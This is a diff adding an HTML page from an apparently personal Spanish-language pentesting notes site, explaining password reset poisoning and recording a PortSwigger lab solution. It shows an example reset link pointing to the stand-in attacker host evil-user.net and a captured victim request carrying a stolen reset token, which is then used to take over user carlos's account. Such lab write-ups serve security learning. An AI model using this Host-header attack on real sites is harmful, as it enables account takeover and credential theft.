@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;h2 id=&quot;how-to-construct-a-password-reset-poisoning-attack&quot;&gt;How to construct a password reset poisoning attack&lt;/h2&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <h2 id="how-to-construct-a-password-reset-poisoning-attack">How to construct a password reset poisoning attack</h2>
+
+<p>If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:</p>
+
+<ol>
+  <li>The attacker obtains the victim’s email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we’ll use <code class="language-plaintext highlighter-rouge">evil-user.net</code>.</li>
+  <li>The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker’s server:</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j</code></p>
+<ol>
+  <li>If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker’s server.</li>
+  <li>The attacker can now visit the real URL for the vulnerable website and supply the victim’s stolen token via the corresponding parameter. They will then be able to reset the user’s password to whatever they like and subsequently log in to their account.</li>
+</ol>
+
+<p>Cambiamos la cabecera host de la petición por nuestro dominio  del exploit server, cuando la víctima clique nos llega lo siguiente :</p>
+
+<p><code class="language-plaintext highlighter-rouge">10.0.4.72       2024-11-21 18:23:38 +0000 "GET /forgot-password?temp-forgot-password-token=jgzq496oxk077jcaa624cr9gdbysxopn HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"</code></p>
+
+<p>Accedemos al dominio real /forgot-password?temp-forgot-password-token=jgzq496oxk077jcaa624cr9gdbysxopn y cambiamos la contraseña de carlos</p>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
